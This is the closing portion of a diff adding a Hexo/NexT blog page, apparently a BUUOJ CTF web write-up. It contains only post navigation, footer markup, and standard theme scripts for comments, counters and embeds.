+                <a href="/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/" rel="prev" title="BUUOJ刷题-Web-极客大挑战2019-Buyflag">
+                  <i class="fa fa-chevron-left"></i> BUUOJ刷题-Web-极客大挑战2019-Buyflag
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/" rel="next" title="BUUOJ刷题-Web-easy_serialize_php">
+                  BUUOJ刷题-Web-easy_serialize_php <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
